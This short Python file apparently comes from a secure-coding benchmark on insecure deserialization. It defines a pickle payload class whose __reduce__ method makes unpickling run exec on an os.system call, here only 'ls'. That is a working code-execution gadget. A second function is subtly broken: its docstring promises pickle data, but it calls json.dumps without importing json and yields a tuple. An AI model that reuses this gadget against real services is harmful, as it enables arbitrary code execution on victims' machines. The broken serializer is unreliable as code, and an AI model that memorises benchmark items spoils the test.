import pickle


class Payload(object):
    def __reduce__(self):
        return exec, ('import os;os.system("ls")',)


def makePickleData(payload: Payload):
    '''
    Get serialized data from the payload object and serialize it before returning it
    '''
    yield payload, json.dumps(payload, sort_keys=True)


